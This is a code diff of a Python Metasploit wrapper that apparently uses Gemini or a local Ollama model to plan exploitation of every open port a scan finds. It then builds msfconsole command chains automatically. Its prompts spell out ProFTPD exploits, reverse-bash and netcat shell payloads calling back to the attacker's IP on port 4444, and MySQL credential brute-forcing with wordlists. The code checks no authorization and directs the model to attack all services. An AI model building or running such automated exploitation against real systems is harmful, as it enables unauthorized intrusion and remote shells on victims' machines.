@@ -8,10 +8,13 @@ import re
 import subprocess
 import tempfile
 import os
+import socket
+import time
 from typing import Dict, Optional
 from rich.console import Console
 from rich.panel import Panel
 from rich.syntax import Syntax
+from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
 from .base_tool import BaseTool
 
 console = Console()
@@ -22,6 +25,73 @@ class MetasploitTool(BaseTool):
     def __init__(self):
         super().__init__(name="Metasploit Framework", command="msfconsole")
         self.description = "Find and run exploits using Metasploit Framework"
+    
+    def get_local_ip(self, silent: bool = False) -> str:
+        """Get the local IP address for LHOST"""
+        try:
+            # Try using ip command first
+            result = self.run_command("ip addr show | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1 | head -1", silent=silent)
+            if result['success'] and result['stdout'].strip():
+                return result['stdout'].strip()
+            
+            # Fallback to hostname command
+            result = self.run_command("hostname -I | awk '{print $1}'", silent=silent)
+            if result['success'] and result['stdout'].strip():
+                return result['stdout'].strip()
+            
+            # Python fallback
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+            return local_ip
+        except Exception as e:
+            console.print(f"[yellow]Warning: Could not detect local IP, using 127.0.0.1[/yellow]")
+            return "127.0.0.1"
+    
+    def validate_ports(self, commands: list, scan_context: Optional[Dict] = None) -> list:
+        """Validate that RPORT values in commands match ports from scan results"""
+        if not scan_context or 'open_ports' not in scan_context:
+            # No scan context, can't validate
+            return commands
+        
+        # Get list of valid ports from scan
+        valid_ports = set()
+        for port in scan_context.get('open_ports', []):
+            port_num = port.get('port')
+            if port_num:
+                valid_ports.add(str(port_num))
+        
+        if not valid_ports:
+            return commands
+        
+        validated_commands = []
+        skip_until_next_use = False
+        
+        for cmd in commands:
+            # Check if this is a set RPORT command
+            if cmd.strip().lower().startswith('set rport '):
+                port_value = cmd.split()[-1].strip()
+                if port_value not in valid_ports:
+                    console.print(f"[yellow]⚠ Skipping exploit for port {port_value} (not in scan results)[/yellow]")
+                    skip_until_next_use = True
+                    continue
+                else:
+                    skip_until_next_use = False
+            
+            # If we're skipping commands until next 'use', check if this is a 'use' command
+            if skip_until_next_use:
+                if cmd.strip().lower().startswith('use ') or cmd.strip().lower().startswith('search '):
+                    skip_until_next_use = False
+                else:
+                    continue  # Skip this command
+            
+            validated_commands.append(cmd)
+        
+        if len(validated_commands) < len(commands):
+            console.print(f"[cyan]ℹ Filtered {len(commands) - len(validated_commands)} commands targeting invalid ports[/cyan]")
+        
+        return validated_commands
     
     def check_installed(self) -> bool:
         """Check if msfconsole is installed"""
@@ -35,6 +105,99 @@ class MetasploitTool(BaseTool):
             return True
         return False
     
+    def search_msf_modules(self, service: str, version: str = "", silent: bool = False) -> list:
+        """Search for real Metasploit modules for a service"""
+        search_query = f"{service} {version}".strip()
+        cmd = f'msfconsole -q -x "search {search_query}; exit" 2>/dev/null'
+        
+        if not silent:
+            with Progress(
+                SpinnerColumn(),
+                TextColumn("[cyan]{task.description}"),
+                transient=True
+            ) as progress:
+                task = progress.add_task(f"Searching Metasploit database for {service} modules...", total=None)
+                result = self.run_command(cmd, timeout=30, silent=False)
+                progress.update(task, completed=True)
+        else:
+            result = self.run_command(cmd, timeout=30, silent=True)
+        
+        if result['success'] and result['stdout']:
+            # Parse module names from output
+            modules = []
+            for line in result['stdout'].split('\n'):
+                # Look for lines with module paths
+                if 'exploit/' in line or 'auxiliary/' in line:
+                    parts = line.split()
+                    for part in parts:
+                        if '/' in part and (part.startswith('exploit/') or part.startswith('auxiliary/')):
+                            # Remove ANSI color codes
+                            clean_part = re.sub(r'\x1b\[[0-9;]+m', '', part)
+                            modules.append(clean_part.strip())
+                            break
+            
+            if not silent:
+                if modules:
+                    console.print(f"[green]✓ Found {len(modules)} module(s) for {service}[/green]")
+                    for mod in modules[:3]:  # Show first 3
+                        console.print(f"  • {mod}", style="dim")
+                else:
+                    console.print(f"[yellow]⚠ No specific modules found for {service}[/yellow]")
+            
+            return modules
+        
+        return []
+    
+    def validate_module(self, module_path: str, silent: bool = False) -> bool:
+        """Check if a Metasploit module exists"""
+        # Remove ANSI color codes from module path
+        clean_module = re.sub(r'\x1b\[[0-9;]+m', '', module_path)
+        cmd = f'msfconsole -q -x "use {clean_module}; exit" 2>&1'
+        result = self.run_command(cmd, timeout=15, silent=silent)
+        
+        if result['success']:
+            output = result['stdout'].lower()
+            # Check for error messages
+            if 'failed to load' in output or 'no results from search' in output:
+                return False
+            return True
+        return False
+    
+    def get_module_payloads(self, module_path: str, silent: bool = False) -> list:
+        """Get compatible payloads for a module"""
+        # Remove ANSI color codes from module path
+        clean_module = re.sub(r'\x1b\[[0-9;]+m', '', module_path)
+        cmd = f'msfconsole -q -x "use {clean_module}; show payloads; exit" 2>/dev/null'
+        
+        if not silent:
+            with Progress(
+                SpinnerColumn(),
+                TextColumn("[cyan]{task.description}"),
+                transient=True
+            ) as progress:
+                task = progress.add_task(f"Checking compatible payloads for {clean_module}...", total=None)
+                result = self.run_command(cmd, timeout=20, silent=False)
+                progress.update(task, completed=True)
+        else:
+            result = self.run_command(cmd, timeout=20, silent=True)
+        
+        payloads = []
+        if result['success'] and result['stdout']:
+            for line in result['stdout'].split('\n'):
+                line = line.strip()
+                # Look for payload paths
+                if line.startswith('cmd/') or line.startswith('generic/') or line.startswith('linux/'):
+                    parts = line.split()
+                    if parts:
+                        payloads.append(parts[0])
+        
+        if not silent and payloads:
+            console.print(f"[green]✓ Found {len(payloads)} compatible payload(s)[/green]")
+            for p in payloads[:3]:
+                console.print(f"  • {p}", style="dim")
+        
+        return payloads
+    
     def generate_command(self, user_request: str, scan_context: Optional[Dict] = None) -> str:
         """
         Generate Metasploit commands based on user request and previous scan data
@@ -43,44 +206,356 @@ class MetasploitTool(BaseTool):
             user_request: What the user wants to do
             scan_context: Previous scan results (nmap data, target info, etc.)
         """
-        # Get AI to generate the msfconsole commands
-        prompt = self.get_ai_prompt(user_request, scan_context)
+        console.print("\n[bold cyan]🤖 AI is analyzing scan results and planning exploitation...[/bold cyan]")
+        
+        # Get AI to decide which ports and services to target
+        plan_prompt = self.get_planning_prompt(user_request, scan_context)
         
         try:
-            import ollama
-            response = ollama.chat(model='dolphin-llama3:8b', messages=[
-                {
-                    'role': 'system',
-                    'content': prompt
-                },
-                {
-                    'role': 'user',
-                    'content': user_request
-                }
-            ])
+            # Three-tier AI fallback: Gemini 2.5 Pro (best) → Gemini 2.0 Flash (fast) → Ollama (local)
+            plan = None
+            ai_used = None
             
-            ai_response = response['message']['content']
+            # Check if Gemini is available
+            try:
+                import google.generativeai as genai
+                import os
+                from dotenv import load_dotenv
+                
+                load_dotenv()
+                api_key = os.getenv('GOOGLE_API_KEY')
+                
+                if api_key:
+                    # Try Gemini 2.5 Pro first (most capable)
+                    try:
+                        with Progress(
+                            SpinnerColumn(),
+                            TextColumn("[cyan]{task.description}"),
+                            transient=True
+                        ) as progress:
+                            task = progress.add_task("💭 AI (Gemini 2.5 Pro) is selecting target ports and services...", total=None)
+                            
+                            genai.configure(api_key=api_key)
+                            model = genai.GenerativeModel('gemini-2.5-pro')
+                            
+                            response = model.generate_content(f"{plan_prompt}\n\nUser request: {user_request}")
+                            plan = response.text
+                            ai_used = "Google Gemini 2.5 Pro"
+                            progress.update(task, completed=True)
+                    except Exception as gemini_pro_error:
+                        console.print(f"[yellow]⚠ Gemini 2.5 Pro failed: {str(gemini_pro_error)}[/yellow]")
+                        console.print(f"[dim]Trying Gemini 2.5 Flash...[/dim]")
+                        
+                        # Try Gemini 2.5 Flash (faster, fallback)
+                        try:
+                            with Progress(
+                                SpinnerColumn(),
+                                TextColumn("[cyan]{task.description}"),
+                                transient=True
+                            ) as progress:
+                                task = progress.add_task("💭 AI (Gemini 2.5 Flash) is selecting target ports and services...", total=None)
+                                
+                                genai.configure(api_key=api_key)
+                                model = genai.GenerativeModel('gemini-2.5-flash')
+                                
+                                response = model.generate_content(f"{plan_prompt}\n\nUser request: {user_request}")
+                                plan = response.text
+                                ai_used = "Google Gemini 2.5 Flash"
+                                progress.update(task, completed=True)
+                        except Exception as gemini_flash_error:
+                            console.print(f"[yellow]⚠ Gemini 2.5 Flash failed: {str(gemini_flash_error)}[/yellow]")
+                            console.print(f"[dim]Falling back to Ollama...[/dim]")
+                            plan = None
+                else:
+                    console.print(f"[dim]No GOOGLE_API_KEY found, using Ollama...[/dim]")
+            except ImportError:
+                console.print(f"[dim]Gemini library not available, using Ollama...[/dim]")
             
-            # Debug: Show AI response
-            if not ai_response or len(ai_response.strip()) < 10:
-                console.print(f"[yellow]Warning: AI returned empty or very short response[/yellow]")
-                console.print(f"[dim]Response: {ai_response}[/dim]")
+            # Fallback to Ollama if both Gemini models failed or not available
+            if not plan:
+                import ollama
+                
+                with Progress(
+                    SpinnerColumn(),
+                    TextColumn("[cyan]{task.description}"),
+                    transient=True
+                ) as progress:
+                    task = progress.add_task("💭 AI (Ollama) is selecting target ports and services...", total=None)
+                    
+                    plan_response = ollama.chat(model='dolphin-llama3:8b', messages=[
+                        {
+                            'role': 'system',
+                            'content': plan_prompt
+                        },
+                        {
+                            'role': 'user',
+                            'content': user_request
+                        }
+                    ])
+                    plan = plan_response['message']['content']
+                    ai_used = "Ollama dolphin-llama3:8b"
+                    progress.update(task, completed=True)
             
-            # Extract commands from AI response
-            commands = self.extract_commands(ai_response)
+            console.print(f"\n[dim]🤖 Using: {ai_used}[/dim]")
+            console.print(f"\n[yellow]📋 AI Exploitation Plan:[/yellow]")
+            console.print(Panel(plan, border_style="dim", padding=(1, 2)))
             
-            if commands:
-                console.print(f"\n[cyan]Generated Metasploit commands:[/cyan]")
-                for cmd in commands:
-                    console.print(f"  • {cmd}", style="yellow")
-                return commands
+            # Extract services to target from plan
+            console.print("\n[cyan]🔄 Parsing exploitation plan...[/cyan]")
+            services_to_exploit = self.parse_exploitation_plan(plan, scan_context)
+            
+            if not services_to_exploit:
+                console.print("[red]❌ No services could be extracted from plan[/red]")
+                return []
+            
+            console.print(f"\n[bold green]✓ Identified {len(services_to_exploit)} target(s) for exploitation[/bold green]\n")
+            
+            # Build validated commands for each service
+            all_commands = []
+            
+            # Process all services with progress bar
+            for i, service_info in enumerate(services_to_exploit, 1):
+                # Update progress at bottom
+                progress_percent = int((i / len(services_to_exploit)) * 100)
+                filled = int((i / len(services_to_exploit)) * 40)
+                empty = 40 - filled
+                bar = f"\033[92m{'█' * filled}\033[90m{'░' * empty}\033[0m"
+                
+                import sys
+                sys.stdout.write(f"\r[{bar}] {progress_percent}% \033[96m({i}/{len(services_to_exploit)}) {service_info['service']}:{service_info['port']}\033[0m")
+                sys.stdout.flush()
+                
+                # Search for real modules (silently)
+                modules = self.search_msf_modules(service_info['service'], service_info.get('version', ''), silent=True)
+                
+                if not modules:
+                    modules = self.get_auxiliary_modules(service_info['service'], service_info['port'])
+                
+                # Clear progress bar
+                sys.stdout.write('\r\033[K')
+                sys.stdout.flush()
+                
+                if modules:
+                    module = modules[0]
+                    
+                    # Validate module (silently)
+                    if self.validate_module(module, silent=True):
+                        commands = self.build_commands_for_module(
+                            module, 
+                            service_info, 
+                            scan_context,
+                            silent=True
+                        )
+                        all_commands.extend(commands)
+                        console.print(f"[green]✓ [{i}/{len(services_to_exploit)}] {service_info['service']}:{service_info['port']} - {module} - {len(commands)} commands[/green]")
+                    else:
+                        console.print(f"[yellow]⚠ [{i}/{len(services_to_exploit)}] {service_info['service']}:{service_info['port']} - Module validation failed[/yellow]")
+                else:
+                    console.print(f"[dim]✗ [{i}/{len(services_to_exploit)}] {service_info['service']}:{service_info['port']} - No exploits available[/dim]")
+            
+            # Summary after progress bar completes
+            console.print("\n[bold cyan]📊 Exploitation Summary:[/bold cyan]")
+            if all_commands:
+                console.print(f"[bold green]✅ Successfully generated {len(all_commands)} validated commands![/bold green]\n")
+                console.print(f"[cyan]📝 Final command list:[/cyan]")
+                for idx, cmd in enumerate(all_commands, 1):
+                    console.print(f"  {idx}. [yellow]{cmd}[/yellow]")
+                return all_commands
             else:
-                console.print("[red]Could not generate valid Metasploit commands[/red]")
+                console.print("[red]❌ No valid commands could be generated[/red]")
                 return []
                 
         except Exception as e:
-            console.print(f"[red]Error generating command: {e}[/red]")
+            console.print(f"[red]❌ Error generating command: {e}[/red]")
+            import traceback
+            console.print(f"[dim]{traceback.format_exc()}[/dim]")
             return []
+    
+    def get_planning_prompt(self, user_request: str, scan_context: Optional[Dict] = None) -> str:
+        """Create prompt for AI to plan exploitation"""
+        
+        context_info = ""
+        if scan_context and scan_context.get('open_ports'):
+            context_info = "=== SCAN RESULTS ===\n"
+            for port in scan_context['open_ports']:
+                context_info += f"Port {port.get('port')}: {port.get('service')} - {port.get('version', 'unknown version')}\n"
+            context_info += "\n"
+        
+        return f"""{context_info}You are a penetration testing expert analyzing scan results.
+
+CRITICAL: You MUST respond with ONLY the format below, NO OTHER TEXT.
+
+For each open port, output EXACTLY this format (one line per port):
+PORT: <number> | SERVICE: <name> | ATTACK: exploit | REASON: <short reason>
+
+DO NOT include explanations, introductions, or any other text.
+DO NOT use auxiliary - ONLY use "exploit" for ATTACK type.
+DO NOT add markdown, numbering, or bullets.
+
+EXAMPLE OUTPUT:
+PORT: 21 | SERVICE: ftp | ATTACK: exploit | REASON: ProFTPD backdoor
+PORT: 22 | SERVICE: ssh | ATTACK: exploit | REASON: Brute force authentication
+PORT: 80 | SERVICE: http | ATTACK: exploit | REASON: Apache path traversal
+PORT: 3306 | SERVICE: mysql | ATTACK: exploit | REASON: Database credential attack
+
+NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else 0} PORTS FOUND:"""
+    
+    def parse_exploitation_plan(self, plan: str, scan_context: Optional[Dict] = None) -> list:
+        """Parse AI's exploitation plan into structured data"""
+        services = []
+        
+        for line in plan.split('\n'):
+            line = line.strip()
+            
+            # Skip empty lines and headers
+            if not line or line.startswith('Based on') or line.startswith('Here'):
+                continue
+            
+            # Look for numbered lists or PORT: format
+            if 'PORT:' in line and 'SERVICE:' in line:
+                try:
+                    # Extract port and service using regex
+                    port_match = re.search(r'PORT:\s*(\d+)', line, re.IGNORECASE)
+                    service_match = re.search(r'SERVICE:\s*([a-zA-Z0-9_/-]+)', line, re.IGNORECASE)
+                    attack_match = re.search(r'ATTACK:\s*(exploit|auxiliary)', line, re.IGNORECASE)
+                    
+                    if port_match and service_match:
+                        port = port_match.group(1)
+                        service = service_match.group(1).lower()
+                        attack_type = attack_match.group(1).lower() if attack_match else 'auxiliary'
+                        
+                        # Get version from scan context
+                        version = ""
+                        if scan_context and scan_context.get('open_ports'):
+                            for p in scan_context['open_ports']:
+                                if str(p.get('port')) == str(port):
+                                    version = p.get('version', '')
+                                    service = p.get('service', service)  # Use scan service name
+                                    break
+                        
+                        services.append({
+                            'port': port,
+                            'service': service,
+                            'attack_type': attack_type,
+                            'version': version
+                        })
+                        console.print(f"[green]✓ Queued: {service} on port {port} ({attack_type})[/green]")
+                except Exception as e:
+                    console.print(f"[dim]⚠ Could not parse: {line[:80]}...[/dim]")
+                    continue
+            
+            # Also handle numbered format like "1. PORT: 21..."
+            elif re.match(r'^\d+\.\s+PORT:', line, re.IGNORECASE):
+                try:
+                    port_match = re.search(r'PORT:\s*(\d+)', line, re.IGNORECASE)
+                    service_match = re.search(r'SERVICE:\s*([a-zA-Z0-9_/-]+)', line, re.IGNORECASE)
+                    attack_match = re.search(r'ATTACK:\s*(exploit|auxiliary)', line, re.IGNORECASE)
+                    
+                    if port_match and service_match:
+                        port = port_match.group(1)
+                        service = service_match.group(1).lower()
+                        attack_type = attack_match.group(1).lower() if attack_match else 'auxiliary'
+                        
+                        # Get version from scan context
+                        version = ""
+                        if scan_context and scan_context.get('open_ports'):
+                            for p in scan_context['open_ports']:
+                                if str(p.get('port')) == str(port):
+                                    version = p.get('version', '')
+                                    service = p.get('service', service)
+                                    break
+                        
+                        services.append({
+                            'port': port,
+                            'service': service,
+                            'attack_type': attack_type,
+                            'version': version
+                        })
+                        console.print(f"[green]✓ Queued: {service} on port {port} ({attack_type})[/green]")
+                except Exception as e:
+                    continue
+        
+        if not services:
+            console.print("[yellow]⚠ No services parsed from plan, trying fallback extraction...[/yellow]")
+            # Fallback: extract all port numbers mentioned
+            if scan_context and scan_context.get('open_ports'):
+                for port_info in scan_context['open_ports']:
+                    services.append({
+                        'port': str(port_info['port']),
+                        'service': port_info.get('service', 'unknown'),
+                        'attack_type': 'auxiliary',
+                        'version': port_info.get('version', '')
+                    })
+                    console.print(f"[cyan]→ Auto-queued: {port_info.get('service')} on port {port_info['port']}[/cyan]")
+        
+        return services
+    
+    def get_auxiliary_modules(self, service: str, port: str) -> list:
+        """Get auxiliary modules for common services"""
+        auxiliary_map = {
+            'ftp': ['auxiliary/scanner/ftp/ftp_version', 'auxiliary/scanner/ftp/ftp_login'],
+            'ssh': ['auxiliary/scanner/ssh/ssh_version', 'auxiliary/scanner/ssh/ssh_login'],
+            'smtp': ['auxiliary/scanner/smtp/smtp_version', 'auxiliary/scanner/smtp/smtp_enum'],
+            'pop3': ['auxiliary/scanner/pop3/pop3_version', 'auxiliary/scanner/pop3/pop3_login'],
+            'imap': ['auxiliary/scanner/imap/imap_version'],
+            'mysql': ['auxiliary/scanner/mysql/mysql_version', 'auxiliary/scanner/mysql/mysql_login'],
+            'http': ['auxiliary/scanner/http/http_version', 'auxiliary/scanner/http/http_header'],
+            'https': ['auxiliary/scanner/http/http_version', 'auxiliary/scanner/http/http_header'],
+            'telnet': ['auxiliary/scanner/telnet/telnet_version', 'auxiliary/scanner/telnet/telnet_login'],
+            'dns': ['auxiliary/scanner/dns/dns_amp'],
+            'rpcbind': ['auxiliary/scanner/misc/sunrpc_portmapper']
+        }
+        
+        service_lower = service.lower()
+        if service_lower in auxiliary_map:
+            return auxiliary_map[service_lower]
+        
+        return []
+    
+    def build_commands_for_module(self, module: str, service_info: dict, scan_context: Optional[Dict] = None, silent: bool = False) -> list:
+        """Build validated commands for a module"""
+        commands = []
+        local_ip = self.get_local_ip(silent=silent)
+        target_host = scan_context.get('ip') or scan_context.get('target', 'TARGET') if scan_context else 'TARGET'
+        
+        # Remove ANSI color codes from module path
+        clean_module = re.sub(r'\x1b\[[0-9;]+m', '', module)
+        
+        if not silent:
+            console.print(f"[cyan]🔨 Building commands for {clean_module}...[/cyan]")
+        
+        # Use the module
+        commands.append(f"use {clean_module}")
+        
+        # Set RHOSTS
+        commands.append(f"set RHOSTS {target_host}")
+        
+        # Set RPORT
+        commands.append(f"set RPORT {service_info['port']}")
+        
+        # Check if it's an exploit (needs payload) or auxiliary
+        if clean_module.startswith('exploit/'):
+            payloads = self.get_module_payloads(clean_module, silent=silent)
+            
+            if payloads:
+                # Use first compatible payload
+                payload = payloads[0]
+                if not silent:
+                    console.print(f"[green]✓ Using payload: {payload}[/green]")
+                commands.append(f"set PAYLOAD {payload}")
+                commands.append(f"set LHOST {local_ip}")
+                commands.append(f"set LPORT 4444")
+            elif not silent:
+                console.print(f"[yellow]⚠ No payloads found, module may not need one[/yellow]")
+            
+            commands.append("exploit")
+        else:
+            # Auxiliary module
+            if not silent:
+                console.print(f"[green]✓ Auxiliary module, no payload needed[/green]")
+            commands.append("run")
+        
+        return commands
     
     def get_ai_prompt(self, user_request: str, scan_context: Optional[Dict] = None) -> str:
         """Create AI prompt with scan context"""
@@ -90,8 +565,12 @@ class MetasploitTool(BaseTool):
             console.print(f"[yellow]Warning: scan_context is not a dict, ignoring[/yellow]")
             scan_context = None
         
+        # Get local IP for LHOST
+        local_ip = self.get_local_ip(silent=True)
+        
         context_info = ""
         target_host = "TARGET"
+        all_ports_info = ""
         
         if scan_context:
             context_info = "\n\n=== PREVIOUS SCAN DATA ===\n"
@@ -107,10 +586,26 @@ class MetasploitTool(BaseTool):
             
             if 'open_ports' in scan_context and scan_context['open_ports']:
                 context_info += f"\nOpen Ports Found:\n"
+                ports_list = []
                 for port in scan_context['open_ports']:
-                    context_info += f"  - Port {port.get('port', 'unknown')}: "
-                    context_info += f"{port.get('service', 'unknown')} "
-                    context_info += f"({port.get('version', 'no version detected')})\n"
+                    port_num = port.get('port', 'unknown')
+                    service = port.get('service', 'unknown')
+                    version = port.get('version', 'no version detected')
+                    context_info += f"  - Port {port_num}: {service} ({version})\n"
+                    ports_list.append({
+                        'port': port_num,
+                        'service': service,
+                        'version': version
+                    })
+                
+                # Create detailed port exploitation guidance
+                if ports_list:
+                    all_ports_info = "\n\n=== AVAILABLE PORTS FOR EXPLOITATION ===\n"
+                    all_ports_info += "You should attempt to exploit ALL relevant vulnerable ports below:\n"
+                    for p in ports_list:
+                        all_ports_info += f"\n• Port {p['port']} ({p['service']}): {p['version']}\n"
+                        all_ports_info += f"  → Use: set RPORT {p['port']}\n"
+                    all_ports_info += "\nGenerate separate exploit commands for EACH exploitable port.\n"
             
             if 'os' in scan_context:
                 context_info += f"\nOperating System: {scan_context['os']}\n"
@@ -119,75 +614,120 @@ class MetasploitTool(BaseTool):
         
         prompt = f"""You are a Metasploit penetration testing expert performing authorized security testing.
 
-{context_info}
+{context_info}{all_ports_info}
 
-YOUR MISSION: Generate EXECUTABLE msfconsole commands to exploit the target.
+YOUR MISSION: Generate EXECUTABLE msfconsole commands to exploit ALL relevant ports from the scan.
 
 CRITICAL FORMAT RULES:
 1. Output ONLY raw msfconsole commands, one per line
 2. NO explanations, NO descriptions, NO markdown, NO numbering
 3. NO sentences like "Searching for..." or "Scanning for..."
 4. ONLY actual commands that msfconsole can execute
-5. Use EXACTLY "{target_host}" for RHOSTS - DO NOT modify it, DO NOT add "www." prefix
+5. Use EXACTLY "{target_host}" for RHOSTS - DO NOT modify it
+6. ONLY exploit ports listed in the scan data above
 
-REQUIRED COMMAND FORMAT (example):
-search proftpd
-use exploit/unix/ftp/proftpd_133c_backdoor
+CRITICAL PAYLOAD RULES:
+- NEVER use spaces in payload names: cmd/unix/reverse_bash NOT cmd/ unix /reverse
+- After 'use exploit/...', check available payloads first
+- Common valid payloads:
+  * cmd/unix/reverse_bash (for Unix/Linux reverse shells)
+  * cmd/unix/reverse_netcat (if netcat is available)
+  * generic/shell_reverse_tcp (generic reverse shell)
+  * cmd/unix/interact (for backdoors without payload)
+- Set payload BEFORE setting LHOST/LPORT
+- Only set LHOST/LPORT after setting a valid PAYLOAD
+
+REQUIRED WORKFLOW FOR EACH EXPLOIT:
+1. Search for exploit: search <service> <version>
+2. Select exploit: use exploit/path/to/exploit
+3. Set target: set RHOSTS {target_host}
+4. Set port: set RPORT <port>
+5. Set payload: set PAYLOAD cmd/unix/reverse_bash
+6. Set attacker IP: set LHOST {local_ip}
+7. Set listener port: set LPORT 4444
+8. Run: exploit
+
+MULTI-PORT EXPLOITATION:
+You MUST generate exploit attempts for ALL exploitable services:
+- FTP (21): ProFTPD exploits (modcopy, backdoor)
+- SSH (22): auxiliary/scanner/ssh/ssh_login (NO payload needed)
+- SMTP (25,465,587): auxiliary/scanner/smtp/smtp_enum, smtp_version
+- HTTP (80,443): Search for Apache exploits, web app vulnerabilities
+- POP3 (110,995): auxiliary/scanner/pop3/pop3_login
+- IMAP (143,993): auxiliary/scanner/imap/imap_login
+- MySQL (3306): auxiliary/scanner/mysql/mysql_login, mysql_version
+- DNS (53): auxiliary/scanner/dns/dns_amp
+
+CORRECT EXAMPLE - FTP with ProFTPD:
+use exploit/unix/ftp/proftpd_modcopy_exec
 set RHOSTS {target_host}
 set RPORT 21
-set PAYLOAD cmd/unix/reverse
-set LHOST tun0
+set SITEPATH /var/www/html
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST {local_ip}
 set LPORT 4444
-check
 exploit
 
-CRITICAL RHOSTS RULES:
-- Use RHOSTS {target_host} EXACTLY as provided
-- DO NOT add "www." before IP addresses
-- DO NOT modify the target value in any way
-- If target is an IP, use the IP directly: {target_host}
-- If target is a domain, use the domain: {target_host}
+CORRECT EXAMPLE - MySQL enumeration:
+use auxiliary/scanner/mysql/mysql_version
+set RHOSTS {target_host}
+set RPORT 3306
+run
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS {target_host}
+set RPORT 3306
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set STOP_ON_SUCCESS true
+run
 
-CRITICAL: Always include payload configuration!
-- For exploits: set PAYLOAD, set LHOST, set LPORT
-- For auxiliary modules: No payload needed
-- Use LHOST tun0 or LHOST eth0 (let the system choose interface)
-
-EXPLOITATION STRATEGY:
-- For FTP (port 21): Search version-specific exploits, set payload
-- For SSH (port 22): Use auxiliary/scanner/ssh/ssh_login (no payload)
-- For SMTP (port 25, 587): Use auxiliary/scanner/smtp/smtp_enum (no payload)
-- For HTTP (port 80, 443): Search web exploits, set payload
-- For MySQL (port 3306): Use auxiliary/scanner/mysql/mysql_login (no payload)
-- For Telnet (port 23): Use auxiliary/scanner/telnet/telnet_login (no payload)
-
-EXAMPLE OUTPUT FOR EXPLOIT (CORRECT):
-search proftpd
-use exploit/unix/ftp/proftpd_133c_backdoor
+CORRECT EXAMPLE - Multiple ports:
+use exploit/unix/ftp/proftpd_modcopy_exec
 set RHOSTS {target_host}
 set RPORT 21
-set PAYLOAD cmd/unix/reverse
-set LHOST tun0
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST {local_ip}
 set LPORT 4444
 exploit
-
-EXAMPLE OUTPUT FOR AUXILIARY (CORRECT):
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS {target_host}
+set RPORT 3306
+run
 use auxiliary/scanner/smtp/smtp_enum
 set RHOSTS {target_host}
 set RPORT 25
 run
 
-EXAMPLE OUTPUT (WRONG - DO NOT DO THIS):
-1. Searching for SMTP vulnerabilities...
-   - Found smtp_enum module
-2. Scanning port 25...
+WRONG EXAMPLE (spaces in payload):
+set PAYLOAD cmd/ unix /reverse  ❌ INVALID
 
-Remember: 
-- EXPLOITS need PAYLOAD configuration
-- AUXILIARY modules just need 'run'
-- Output ONLY executable commands, nothing else."""
+CRITICAL REQUIREMENTS:
+✓ Exploit ALL ports from scan (not just one)
+✓ Use correct payload names (no spaces)
+✓ Set RHOSTS {target_host} exactly
+✓ Set LHOST {local_ip} for reverse shells
+✓ Use auxiliary modules for enumeration (no payload)
+✓ Match exploit to exact service version when possible"""
 
         return prompt
+    
+    def fix_payload_names(self, commands: list) -> list:
+        """Fix common payload naming issues"""
+        fixed_commands = []
+        
+        for cmd in commands:
+            # Fix spaces in payload names
+            if cmd.strip().lower().startswith('set payload '):
+                # Remove all spaces after "set PAYLOAD "
+                parts = cmd.split(None, 2)  # Split into ['set', 'PAYLOAD', 'rest']
+                if len(parts) == 3:
+                    payload_value = parts[2].replace(' ', '').replace('/', '/')
+                    cmd = f"{parts[0]} {parts[1]} {payload_value}"
+                    console.print(f"[cyan]Fixed payload: {cmd}[/cyan]")
+            
+            fixed_commands.append(cmd)
+        
+        return fixed_commands
     
     def extract_commands(self, ai_response: str) -> list:
         """Extract msfconsole commands from AI response"""
